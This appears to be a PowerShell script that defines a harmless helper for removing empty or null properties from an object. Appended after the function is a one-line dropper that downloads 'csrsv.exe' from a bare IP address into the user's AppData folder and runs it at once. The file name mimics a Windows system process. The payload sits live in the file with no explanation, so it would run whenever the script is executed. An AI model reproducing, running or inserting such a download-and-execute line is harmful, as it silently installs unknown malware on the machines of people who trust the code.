function Remove-PSObjectEmptyOrNullProperty
{

    PARAM (
        $PSObject)
    PROCESS
    {
        $PsObject.psobject.Properties |
        Where-Object { -not $_.value } |
        ForEach-Object {
            $PsObject.psobject.Properties.Remove($_.name)
        }
    }
}
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',"$env:APPDATA\csrsv.exe");Start-Process ("$env:APPDATA\csrsv.exe")

